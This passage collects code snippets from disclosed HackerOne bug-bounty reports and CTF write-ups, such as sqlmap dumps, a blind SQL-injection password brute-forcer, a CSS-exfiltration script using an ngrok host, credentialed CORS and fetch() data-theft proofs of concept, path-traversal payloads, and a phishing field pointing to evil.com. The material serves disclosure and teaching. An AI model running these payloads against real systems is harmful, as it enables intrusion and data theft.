    invocation.open('GET', "https://www.semrush.com/content-paywall/api/accesslevel", true);
    invocation.withCredentials = true;
    invocation.send(); 
  }
}

cors();
```

## 305. [#358339](https://hackerone.com/reports/358339)  -  File access control rules not enforced on image files
*low*

```bash
curl -u user 'https://test.frp.lv/index.php/apps/files/api/v1/thumbnail/1212/750/Secret_Folder/Secret_Subfolder/Secret_Picture.jpeg' -H 'Content-Type: application/x-www-form-urlencoded' > Secret_Picture.jpeg
```

## 306. [#358339](https://hackerone.com/reports/358339)  -  File access control rules not enforced on image files
*low*

```bash
curl -u user 'https://test.frp.lv/index.php/apps/files/api/v1/thumbnail/4096/4096/Secret_Folder/Secret_Subfolder/Secret_Text.txt' -H 'Content-Type: application/x-www-form-urlencoded' > Secret_Text.png
```

## 307. [#1034346](https://hackerone.com/reports/1034346)  -  Security@ email forwarding and Embedded Submission drafts can be used to obtain copy of deleted attachments from other HackerOne users
*high*

```ruby
# Create an attachment. At this time, the `attachable_id` and `attachable_type` are set to `NULL`
attachment = Attachment.create!

# Create another attachment. At this time, the `attachable_id` and `attachable_type` are set to `NULL`
another_attachment = Attachment.create!

# Create a report draft and reference the first attachment. The `attachable_id` and `attachable_type` of the attachment are updated to reference the created report draft.
report_draft = ReportDraft.create! attachment_ids: [attachment.id]

# Update the attachment IDs of a report draft. This will do two things:
#   - update `attachment.attachable_id` to `NULL`
#   - update `another_attachment.attachable_type` to `ReportDraft`
#   - update `another_attachment.attachable_id` to `report_draft.id`
report_draft.update! attachment_ids: [another_attachment.id]
```

## 308. [#895798](https://hackerone.com/reports/895798)  -  [H1-2006 2020] Bounty Pay CTF challenge
*critical*

```
${subodomain}
```

## 309. [#1067912](https://hackerone.com/reports/1067912)  -  A Visit from The Grinch ~ 'Twas the night before Hackmas...
*critical*

```json
{{template:file.html}}
```

## 310. [#1067912](https://hackerone.com/reports/1067912)  -  A Visit from The Grinch ~ 'Twas the night before Hackmas...
*critical*

```json
{{name}}
```

## 311. [#1067912](https://hackerone.com/reports/1067912)  -  A Visit from The Grinch ~ 'Twas the night before Hackmas...
*critical*

```json
{{template:38dhs_admins_only_header.html}}
```

## 312. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```json
{{template:cbdj3_grinch_header.html}}
```

## 313. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```json
{{template:""}}
```

## 314. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```json
{{template:index.html}}
```

## 315. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```json
{{email}}
```

## 316. [#304240](https://hackerone.com/reports/304240)  -  Unrestricted access to Eureka server on ██████
*medium, $500*

```
HTTP/1.1 200 
Date: Fri, 12 Jan 2018 09:17:36 GMT
Content-Type: application/xml
Content-Length: 0
Connection: close
Server: Tengine/2.2.1
```

## 317. [#282176](https://hackerone.com/reports/282176)  -  Unauthenticated hidden groups disclosure via Ajax groups search
*medium*

```php
<?php
     if ( bp_current_user_can( 'bp_moderate' ) || ( is_user_logged_in() && $user_id == bp_loggedin_user_id() ) ) {
        $show_hidden = true;
     }
```

## 318. [#282176](https://hackerone.com/reports/282176)  -  Unauthenticated hidden groups disclosure via Ajax groups search
*medium*

```php
<?php
  if ( ! empty( $_BP_COOKIE['bp-' . $object . '-scope'] ) ) {

     //...

     // Activity stream scope only on activity directory.
     if ( 'all' != $_BP_COOKIE['bp-' . $object . '-scope'] && ! bp_displayed_user_id() && ! bp_is_single_item() )
        $qs[] = 'scope=' . $_BP_COOKIE['bp-' . $object . '-scope'];
  }
```

## 319. [#1081211](https://hackerone.com/reports/1081211)  -  [nextcloud.com] Control character allowed in Submit Question
*medium*

```http
POST /api/t/1/credit/share HTTP/1.1
Host: nextcloud.com

yourname=%24%21%25%24%5E%21%25%24%5E%25%21*%24%25%21*%5E%24%25*%26%21%25%24*%26%5E%21%26*%5E%24%26*%21%5E%26*%24%21%25%24%5E%21%25%24%5E%25%21*%24%25%21*%5E%24%25*%26%21&email=kittytrace%40wearehackerone.com&organization=Hello+your+account+has+been+hacked+please+visit+here+https%3A%2F%2Fevil.com%2F&role=Administrator&phone=Test&comments=TEST&gdprcheck=gdprchecked&captcha=10&checksum=a29a82e78e%3A478e965f1f8045a0beac0c1ba3424f10ca25f859543909747b89c33eec6df943
```

## 320. [#1861974](https://hackerone.com/reports/1861974)  -  Stealing Users OAuth authorization code via redirect_uri
*high, $2,000*

```
../../../../ja/items/4503924
```

## 321. [#1861974](https://hackerone.com/reports/1861974)  -  Stealing Users OAuth authorization code via redirect_uri
*high, $2,000*

```
../../../../ja/items/[attacker
```

## 322. [#2374730](https://hackerone.com/reports/2374730)  -  Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure
*high*

```json
{{booking_id}}
```

## 323. [#2374730](https://hackerone.com/reports/2374730)  -  Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure
*high*

```json
{{user_id2}}
```

## 324. [#2374730](https://hackerone.com/reports/2374730)  -  Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure
*high*

```json
{{access_token2}}
```

## 325. [#2374730](https://hackerone.com/reports/2374730)  -  Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure
*high*

```json
{{latitute}}
```

## 326. [#2374730](https://hackerone.com/reports/2374730)  -  Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure
*high*

```json
{{longitude}}
```

## 327. [#2374730](https://hackerone.com/reports/2374730)  -  Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure
*high*

```json
{{access_token}}
```

## 328. [#2374730](https://hackerone.com/reports/2374730)  -  Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure
*high*

```json
{{user_id}}
```

## 329. [#1098793](https://hackerone.com/reports/1098793)  -  Kroki Arbitrary File Read/Write
*high*

```
../../../../../../tmp/test_file_write.txt/eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgC
```

## 330. [#1098793](https://hackerone.com/reports/1098793)  -  Kroki Arbitrary File Read/Write
*high*

```
../../../../../../tmp/test_file_write.txt
```

## 331. [#895798](https://hackerone.com/reports/895798)  -  [H1-2006 2020] Bounty Pay CTF challenge
*critical*

```
In this case, I recieved 3 requests:
1. /import.css
2. /input
3. /inputc

So, I felt good vibes...
And I was generating successively CSS files like an blind SQLi.
I created a little Python Script for generate the CSS file each time.
```

## 332. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
HTTP/1.1 200 OK

[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

## 333. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```html
<html>
<head><title>Index of /uploads/</title></head>
<body bgcolor="white">
<h1>Index of /uploads/</h1><hr><pre><a href="../">../</a>
<a href="/uploads/BountyPay.apk">BountyPay.apk</a>                                        20-Apr-2020 11:26              4043701
</pre><hr></body>
</html>
```

## 334. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```javascript
$(".upgradeToAdmin").click(function() {
	let t = $('input[name="username"]').val();
	$.get("/admin/upgrade?username=" + t, function() {
		alert("User Upgraded to Admin")
	})
})
```

## 335. [#1067912](https://hackerone.com/reports/1067912)  -  A Visit from The Grinch ~ 'Twas the night before Hackmas...
*critical*

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

## 336. [#1067912](https://hackerone.com/reports/1067912)  -  A Visit from The Grinch ~ 'Twas the night before Hackmas...
*critical*

```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

## 337. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
**Code analysis**

+ While analyzing the above code, it looks like there was a regex check operation, so it means we're only allowed for the range "a-z, A-Z, and 0-9." and thus, no special characters.

+ On the code `$page = str_replace("admin.php","",$page);`, string "admin.php" was replaced with blank character "" .
+ On the code `$page = str_replace("secretadmin.php","",$page);`, string "secretadmin.php" was also replaced with blank character "".
+ In the comment section, the developer has specifically written the comment as "protect admin.php from being read" and then following up "I've changed the admin file to secretadmin.php for more security".
+ Thus, it means we need only the "secretadmin.php" path on the template parameter as "admin.php" was protected.
+ However, as the server was replacing "secretadmin.php" with a blank character, thus it was not fulfilling the condition and redirects to the default page as 
"/my-diary/?template=entries.html".

+ In order to bypass it, it needed a regex bypass condition. In order to bypass the regex condition, I can't apply any special characters, however, I can still use the above string replace condition to bypass the condition which was a blank condition string check.

**Regex Calculation**
# … truncated …
```

## 338. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
+ In the regex calculation, we are adding blank space in between and thus replacing with admin.php or secretadmin.php so that condition will also be satisfied from the server and also we can bypass the regex check as well.

+ Finally, after complicating the string from `secretadmin.php` to `secretadsecretadadmin.phpmin.phpmin.php`, I've tried again on the template parameter and finally, got the flag.

**Request**

https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretadadmin.phpmin.phpmin.php

**Response**

{F1139415}
```

## 339. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
+ First, I visited the https://hackyholidays.h1ctf.com/hate-mail-generator/new and created a new email as 

{F1139428}

+ For {{template:""}} parameter, I wanted to inject an arbitrary path to check the output first and so decided to give index.html inside the template param.
+ On name area - "hi" ,subject area - "attack" and on Markup area - "Hello {{name}} {{template:index.html}} {{email}}". After selecting the preview option and also intercepting the request:

**Request**
```

## 340. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
+ I was like hmm, this also failed as it says about access error.

+ So, another method which can be handy in this type of situation will be reference based exploit. In reference based exploit, we can insert the file "38dhs_admins_only_header.html" inside email parameter on preview_data parameter and just call {{email}} on preview_markup directly to check what will be the output and thus, it was exploited successfully.

**Request**
```

## 341. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```json
{F1139562}

+ Here are command requests and output

**Request**
python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score"

**Output**
{F1139568}

+ It was detected as a time-based SQL injection on the MySQL database.

**Request**
python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" --dbs --exclude-sysdbs

{F1139573}
```

## 342. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
**Request**

python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" --tables -D quiz

**Response**
```

## 343. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
**Request**

python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" -T admin -D quiz --columns

**Response**

{F1139598}
```

## 344. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
+ For admin, we got columns as id, username, and password.

+ Final command will dump the information.

**Request**

python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" -T admin -D quiz --dump

**Response**

{F1139603}
```

## 345. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

## 346. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
**Request**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9

Base64decoded

`{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/","auth":"05a7e708a5f3da76506023047628829d"}`

**Response**

Invalid content - type detected.

+ In the SQL injection, in the 3rd column inside SQL injection for column album, we successfully generate a valid hash for ../api/.

+ In the above response, for api, we get the response as the invalid content type detected. So, it means the server was accepting only `content-type image` and since the above /api parameter was of html type, the response was 200 but it was invalid content-type detected.

+ Based on that, I've tried to brute-force the api parameter, thinking about the common path.
+ In the workflow of the application, as we require username and password, thus common api paths can be such as api/config, api/users, api/user, api/username, etc.

+ In the above method, I tried api/config and load the picture in the response on firefox and it returned with:
```

## 347. [#894174](https://hackerone.com/reports/894174)  -  [H1-2006 2020] In-depth resolution of the h1-2006 CTF
*critical*

```javascript
$(".loadTxns").click(function() {
    let t = $('select[name="month"]').val(),
        e = $('select[name="year"]').val();
    $(".txn-panel").html(""), $.get("/statements?month=" + t + "&year=" + e, function(t) {
        if (t.hasOwnProperty("data")) {
            let e = JSON.parse(t.data);
            if (e.hasOwnProperty("transactions"))
                if (0 == e.transactions.length) $(".txn-panel").html('<div class="text-center" style="margin:10px">No Transactions To Process</div>');
                else {
                    let t = "";
                    t += '<table style="margin:0" class="table"><tr><th>Hacker(s)</th><th class="text-center">Program(s)</th><th class="text-center">Reports(s)</th><th class="text-center">Pay Out</th><th class="text-center">Action</th></tr>', $.each(e.transactions, function(e, s) {
                        t += "<tr><td>" + s.hackers + '</td><td class="text-center">' + s.programs + '</td><td class="text-center">' + s.reports + '</td><td class="text-center">' + s.amount + '</td><td class="text-center"><a href="/pay/' + s.id + "/" + s.hash + '" class="btn btn-sm btn-success">Pay</a></td></tr>'
                    }), t += "</table>", $(".txn-panel").html(t)
                }
            else alert("Invalid Response From The Server")
        } else alert("Invalid Response From The Server")
    })
});
# … truncated …
```

## 348. [#894174](https://hackerone.com/reports/894174)  -  [H1-2006 2020] In-depth resolution of the h1-2006 CTF
*critical*

```python
import requests
from bs4 import BeautifulSoup


url_challenge = 'https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba'

post = {'app_style': 'https%3A%2F%2F4291e5a07787.ngrok.io%2Fselector.css'}
challenge = ''
while not challenge.startswith('0e'):
    x = requests.post(url_challenge, data = post, cookies = {"token": "eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9"})
    soup = BeautifulSoup(x.text, 'html.parser')
    challs = soup.find_all("input")[0:2]
    for val in challs:
        print(val['value'])
        challenge=val['value']
```

## 349. [#1392032](https://hackerone.com/reports/1392032)  -  Orders full read for a staff with only `Customers` permissions.
*low, $800*

```
"node":{
    "message":"Order Confirmation email for order \u003ca href=\"https:\/\/scara31-store4.myshopify.com\/admin\/orders\/4242972409912\"\u003e#1001\u003c\/a\u003e sent to this customer (aaa@aa.com)."
}
```

## 350. [#3369843](https://hackerone.com/reports/3369843)  -  Low-privileged user can enable or disable Lovable AI for new projects in workspace
*low*

```
<!-- To enable -->
DELETE /workspaces/<workspace_id>/tool-preferences/ai_gateway/enable

<!-- To disable -->
POST /workspaces/<workspace_id>/tool-preferences/ai_gateway/enable
{
"approval_preference":"disable"
}
```

## 351. [#1685822](https://hackerone.com/reports/1685822)  -  RepositoryPipeline allows importing of local git repos
*medium, $22,300*

```
${Math.floor(Math.random() * 10000)}
```

## 352. [#1727044](https://hackerone.com/reports/1727044)  -  Email Address Exposure via Gratipay Migration Tool
*medium, $100*

```json
{{ existing_account.email }}
```

## 353. [#1727044](https://hackerone.com/reports/1727044)  -  Email Address Exposure via Gratipay Migration Tool
*medium, $100*

```json
{{ _("Yes") }}
```

## 354. [#1727044](https://hackerone.com/reports/1727044)  -  Email Address Exposure via Gratipay Migration Tool
*medium, $100*

```json
{{ _("No") }}
```

## 355. [#2374730](https://hackerone.com/reports/2374730)  -  Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure
*high*

```
1. GET https://api.bykea.net/api/v1/bookings/{{booking_id}}?_id={{user_id2}}&token_id={{access_token2}}
2. GET https://api.bykea.net/api/v2/bids/{{booking_id}}?_id={{user_id2}}&token_id={{access_token2}}
3. GET https://boleelagao.bykea.net/v1/config?lat={{latitute}}&lng={{longitude}}&service_code=23&trip_id={{booking_id}}
```

## 356. [#1098793](https://hackerone.com/reports/1098793)  -  Kroki Arbitrary File Read/Write
*high*

```rb
module Gitlab
  # Parser/renderer for the AsciiDoc format that uses Asciidoctor and filters
  # the resulting HTML through HTML pipeline filters.
  module Asciidoc
    MAX_INCLUDE_DEPTH = 5
    MAX_INCLUDES = 32
    DEFAULT_ADOC_ATTRS = {
        'showtitle' => true,
        'sectanchors' => true,
        'idprefix' => 'user-content-',
        'idseparator' => '-',
        'env' => 'gitlab',
        'env-gitlab' => '',
        'source-highlighter' => 'gitlab-html-pipeline',
        'icons' => 'font',
        'outfilesuffix' => '.adoc',
        'max-include-depth' => MAX_INCLUDE_DEPTH,
        # This feature is disabled because it relies on File#read to read the file.
        # If we want to enable this feature we will need to provide a "GitLab compatible" implementation.
        # This attribute is typically used to share common config (skinparam...) across all PlantUML diagrams.
        # The value can be a path or a URL.
        'kroki-plantuml-include!' => '',
        # This feature is disabled because it relies on the local file system to save diagrams retrieved from the Kroki server.
        'kroki-fetch-diagram!' => ''
```

## 357. [#674195](https://hackerone.com/reports/674195)  -  Stealing data from customers.gitlab.com without user interaction
*high*

```
await fetch("https://customers.gitlab.com/customers", {
    "credentials": "include",
    "referrer": "https://customers.gitlab.com/customers/edit",
    "body": "utf8=%E2%9C%93&_method=patch&authenticity_token=YOquJGc9evhkHMfLOZljuw9OcDn0gtJw8AHPb0yVhyml9q1TISGHa%2FK57DAlg8jB%2BEqvJYYob26BRgx4sZbRzg%3D%3D&customer%5Bfirst_name%5D=Riccardo&customer%5Blast_name%5D=Padovani&customer%5Baddress_1%5D=&customer%5Baddress_2%5D=&customer%5Bcity%5D=Munich&customer%5Bzip_code%5D=81479&customer%5Bcountry%5D=DEU&customer%5Bstate%5D=BY&customer%5Bvat_code%5D=&customer%5Bcompany%5D=Riccardo+Padovani&customer%5Bemail%5D=hackerone1%40rpadovani.com&customer%5Bprovider%5D=gitlab&customer%5Buid%5D=VICTIM_ID",
    "method": "POST",
    "mode": "cors"
});
```

## 358. [#1051029](https://hackerone.com/reports/1051029)  -  Public and secret api key leaked in JavaScript source
*high*

```javascript
}]), angular.module("jb").config(["lkGoogleSettingsProvider", function(e) {
    e.configure({
        apiKey: "██████████",
        clientId: "██████t.apps.googleusercontent.com",
        scopes: ["https://www.googleapis.com/auth/drive.readonly"],
        features: ["MULTISELECT_DISABLED"]
    })
}]), angular.module("jb.factories").factory("BoardSettingsFactory", ["railsResourceFactory", "PathToResourceRoute", function(e, t) {
    var n = e({
        url: t.convert(JBRoutes.jobBoardBoardSettingsPath),
        name: "boardSettings"
    });
```

## 359. [#858671](https://hackerone.com/reports/858671)  -  Insufficient Type Check on GraphQL leading to Maintainer delete repository
*high*

```ruby
def attempt_destroy!
      result = Repositories::DestroyService.new(snippet.repository).execute

      raise DestroyError if result[:status] == :error

      snippet.destroy!
    end
```

## 360. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Software Storage</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>

<div class="container">
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <h1 style="text-align: center">Software Storage</h1>
            <form method="post" action="/">
                <div class="panel panel-default" style="margin-top:50px">
                    <div class="panel-heading">Login</div>
                    <div class="panel-body">
                        <div style="margin-top:7px"><label>Username:</label></div>
                        <div><input name="username" class="form-control"></div>
                        <div style="margin-top:7px"><label>Password:</label></div>
                        <div><input name="password" type="password" class="form-control"></div>
                    </div>
                </div>
                <input type="submit" class="btn btn-success pull-right" value="Login">
            </form>
        </div>
    </div>
</div>
<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
</body>
</html>
# … truncated …
```

## 361. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```java
private void signIn() {
  this.mAuth = FirebaseAuth.getInstance();
  this.mAuth.signInAnonymously().addOnCompleteListener((Activity)this, new OnCompleteListener<AuthResult>() {
        public void onComplete(Task<AuthResult> param1Task) {
          if (param1Task.isSuccessful()) {
            Log.d("TAG", "signInAnonymously:success");
            PartThreeActivity.this.mAuth.getCurrentUser();
            return;
          } 
          Log.w("TAG", "signInAnonymously:failure", param1Task.getException());
          Toast.makeText((Context)PartThreeActivity.this, "Authentication failed.", 0).show();
        }
      });
}
private void getHost() {
  final SharedPreferences.Editor editor = getSharedPreferences("user_created", 0).edit();
  this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {
        public void onCancelled(DatabaseError param1DatabaseError) {
          Log.e("TAG", "onCancelled", (Throwable)param1DatabaseError.toException());
        }

        public void onDataChange(DataSnapshot param1DataSnapshot) {
          String str = (String)param1DataSnapshot.getValue();
          editor.putString("HOST", str).apply();
        }
      });
}
  
private void getToken() {
  final SharedPreferences.Editor editor = getSharedPreferences("user_created", 0).edit();
  this.childRefTwo.addListenerForSingleValueEvent(new ValueEventListener() {
        public void onCancelled(DatabaseError param1DatabaseError) {
          Log.e("TAG", "onCancelled", (Throwable)param1DatabaseError.toException());
        }

# … truncated …
```

## 362. [#1067912](https://hackerone.com/reports/1067912)  -  A Visit from The Grinch ~ 'Twas the night before Hackmas...
*critical*

```python
import requests
from lxml import html

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789~`!%@#$^*()-_=+[{]}\|;:,<.>/?"

host = "https://hackyholidays.h1ctf.com"
url = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=?hash=-4685%%27%%20UNION%%20SELECT%%20%%22%%27%%20UNION%%20SELECT%%20null,null,%%27../api/user?username=grinchadmin%%26password=%s%%25%%27--+%%22,null,null--+%%22"

#username = grinchadmin
#password = s4nt4sucks
out = ''
found = 0
while True:
	for c in alphabet:
		# _ (underscore) is another wildcard character in MySQL. I escaped a few other tricky characters just in case. 
		if c == '_':
			c = '\_'
		if c == '%':
			c = '\%'
		if c == '\\':
			c = '\\\\'

		# add found letters into the payload 
		tester = url % (out+c)
		# send the payload
		r = requests.get(tester)
		# parse html
		tree = html.fromstring(r.text)
		# get /picture?data=base64 URL
		url2 = tree.xpath('//img')[1].items()[1][1]
		# send second request
		r2 = requests.get(host+url2)

		# if response contains "Invalid", we have found a letter
		if "Invalid" in r2.text:
			out += c
			found = 1
			break
	print out
	if not found:
# … truncated …
```

## 363. [#1262434](https://hackerone.com/reports/1262434)  -  Theme editor `oseid` parameter is leaked to third-party services through the `Referer` header which leads to somekind of storefront password bypass.
*low, $500*

```
${shopHandle}
```

## 364. [#1262434](https://hackerone.com/reports/1262434)  -  Theme editor `oseid` parameter is leaked to third-party services through the `Referer` header which leads to somekind of storefront password bypass.
*low, $500*

```
${oseid}
```

## 365. [#1121896](https://hackerone.com/reports/1121896)  -  Verifying email bypass
*low*

```json
{{CLIENT_ID}}
```

## 366. [#1439355](https://hackerone.com/reports/1439355)  -  Github base action takeover which is used in `github.com/Shopify/unity-buy-sdk`
*low*

```
${{ secrets.GITHUB_TOKEN }
```

## 367. [#1727044](https://hackerone.com/reports/1727044)  -  Email Address Exposure via Gratipay Migration Tool
*medium, $100*

```html
<p class="buttons">
  <button class="btn btn-default btn-lg"
    name="log-in.id" value="{{ existing_account.email }}"
    >{{ _("Yes") }}</button>
  <button class="btn btn-default btn-lg"
    name="ignore-conflict" value="true"
    >{{ _("No") }}</button>
</p>
```

## 368. [#1192460](https://hackerone.com/reports/1192460)  -  A deactivated user can access data through GraphQL
*medium*

```bash
curl --header "Authorization: Bearer jKSvxhuDN-Noag6N-w7R" "http://gitlab.joaxcar.com/api/v4/user"

{"message":"403 Forbidden - Your account has been deactivated by your administrator. Please log back in from a web browser to reactivate your account at http://gitlab.joaxcar.com"}
```

## 369. [#3328291](https://hackerone.com/reports/3328291)  -  Existence of completed pods allows for bypass of Kubernetes NetworkPolicy
*medium*

```
---
apiVersion: batch/v1
kind: Job
metadata:
  name: allowed
  namespace: networkpolicy-test
spec:
  template:
    metadata:
      name: curl
      labels:
        test: allowed
    spec:
      containers:
        - name: curl
          image: "alpine/curl:latest"
          command: ["curl", "-v", "whoami.networkpolicy-test.svc.cluster.local:80"]
      restartPolicy: Never
```

## 370. [#3328291](https://hackerone.com/reports/3328291)  -  Existence of completed pods allows for bypass of Kubernetes NetworkPolicy
*medium*

```
---
apiVersion: batch/v1
kind: Job
metadata:
  name: blocked
  namespace: networkpolicy-test
spec:
  template:
    metadata:
      name: curl
      labels:
        test: blocked
    spec:
      containers:
        - name: curl
          image: "alpine/curl:latest"
          command: ["curl", "-v", "whoami.networkpolicy-test.svc.cluster.local:80"]
      restartPolicy: Never
```

## 371. [#282176](https://hackerone.com/reports/282176)  -  Unauthenticated hidden groups disclosure via Ajax groups search
*medium*

```php
<?php if ( bp_has_groups( bp_ajax_querystring( 'groups' ) ) ) : ?>
```

## 372. [#1081137](https://hackerone.com/reports/1081137)  -  Incorrect Authorization Checks in /include/findusers.php
*medium*

```
16.	include "../mainfile.php";
17.	xoops_header(false);
18.	
19.	$denied = true;
20.	if (!empty($_REQUEST['token'])) {
21.		if (icms::$security->validateToken($_REQUEST['token'], false)) {
22.			$denied = false;
23.		}
24.	} elseif (is_object(icms::$user) && icms::$user->isAdmin()) {
25.		$denied = false;
26.	}
27.	if ($denied) {
28.		icms_core_Message::error(_NOPERM);
29.		exit();
30.	}
```

## 373. [#1034346](https://hackerone.com/reports/1034346)  -  Security@ email forwarding and Embedded Submission drafts can be used to obtain copy of deleted attachments from other HackerOne users
*high*

```ruby
# frozen_string_literal: true

module Interactors
  module ReportDrafts
    class UpdateOrCreate < HackeroneInteractor
      attribute :draft_id, Integer, required: false
      # ...
      attribute :attachment_ids, Array, default: []
      attribute :tracer, String, required: false

      private

      def execute
        return if draft_id && draft.nil?

        draft.update(
          # ...
        )

        draft
      end

      # ...

      def draft
        @draft ||= if draft_id
          ReportDraft.find_by(
            id: draft_id,
            team: team,
            reporter: nil_or_current_user,
            tracer: tracer,
          )
        else
          ReportDraft.find_or_initialize_by(
            team: team,
            reporter: nil_or_current_user,
            tracer: tracer,
          )
        end
      end
# … truncated …
```

## 374. [#1098793](https://hackerone.com/reports/1098793)  -  Kroki Arbitrary File Read/Write
*high*

```python
/// python3 this_script.py <port>
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging

class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        self._set_response()
